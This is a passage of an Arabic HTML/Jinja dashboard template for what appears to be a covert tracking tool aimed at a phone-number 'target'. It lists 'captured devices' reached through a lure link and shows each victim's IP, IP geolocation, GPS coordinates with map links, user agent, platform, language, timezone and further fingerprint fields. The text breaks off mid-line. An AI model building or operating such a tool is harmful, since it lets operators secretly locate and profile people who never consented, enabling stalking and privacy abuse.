<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head>
<meta charset="utf-8">
<meta name="viewport" content="width=device-width, initial-scale=1">
<title>لوحة التحكم — {{ scan.e164 or scan.target_raw }}</title>
<link rel="stylesheet" href="/static/style.css">
</head>
<body class="dash">
<header class="topbar">
  <div>
    <h1>لوحة التحكم</h1>
    <p class="sub">{{ scan.e164 or scan.target_raw }} · {{ scan.carrier or "—" }} · {{ scan.region or "—" }}</p>
  </div>
  <div class="actions">
    <a class="btn small" href="/c/{{ token }}" target="_blank" rel="noopener">فتح صفحة الالتقاط</a>
    <a class="btn small ghost" href="/api/export/{{ token }}" target="_blank" rel="noopener">تصدير JSON</a>
  </div>
</header>

<section class="panel">
  <h2>الأجهزة الملتقطة <span id="count" class="badge">0</span></h2>
  <div id="devices" class="devices"></div>
  <p id="empty" class="note">بانتظار أول جهاز… أرسل رابط الالتقاط للهدف.</p>
</section>

<section class="panel">
  <h2>سجل الأحداث</h2>
  <ul id="events" class="events"></ul>
</section>

<script>
const TOKEN = {{ token | tojson }};
const devicesEl = document.getElementById('devices');
const eventsEl = document.getElementById('events');
const countEl = document.getElementById('count');
const emptyEl = document.getElementById('empty');
let total = 0;

function esc(value) {
  return String(value ?? '').replace(/[&<>"']/g, c => ({'&':'&amp;','<':'&lt;','>':'&gt;','"':'&quot;',"'":'&#39;'}[c]));
}

function row(label, value) {
  if (value === undefined || value === null || value === '') return '';
  return `<div class="row"><span class="lbl">${esc(label)}</span><span class="val">${esc(value)}</span></div>`;
}

function renderDevice(device) {
  const data = device.data || {};
  const nav = data.navigator || {};
  const screen = data.screen || {};
  const geo = data.geolocation || {};
  const ipGeo = device.ip_geo || {};
  const gpu = data.webgl || {};
  const net = data.network || {};
  const battery = data.battery || {};
  const media = data.media || {};

  const mapLink = (geo.latitude && geo.longitude)
    ? `https://www.google.com/maps?q=${geo.latitude},${geo.longitude}`
    : (ipGeo.lat ? `https://www.google.com/maps?q=${ipGeo.lat},${ipGeo.lon}` : '');

  const card = document.createElement('article');
  card.className = 'device';
  card.innerHTML = `
    <header>
      <strong>${esc(device.id)}</strong>
      <time>${esc(device.created_at)}</time>
    </header>
    <div class="grid">
      ${row('IP', device.ip)}
      ${row('IP Geo', [ipGeo.city, ipGeo.regionName, ipGeo.country, ipGeo.isp].filter(Boolean).join(' · '))}
      ${row('GPS', geo.latitude ? `${geo.latitude}, ${geo.longitude} (±${Math.round(geo.accuracy || 0)}m)` : '')}
      ${row('الخريطة', mapLink)}
      ${row('UA', nav.userAgent || device.ua)}
      ${row('المنصة', nav.platform)}
      ${row('اللغة', (nav.languages || []).join(', '))}
      ${row('المنطقة الزمنية', data.intl && data.intl.timeZone
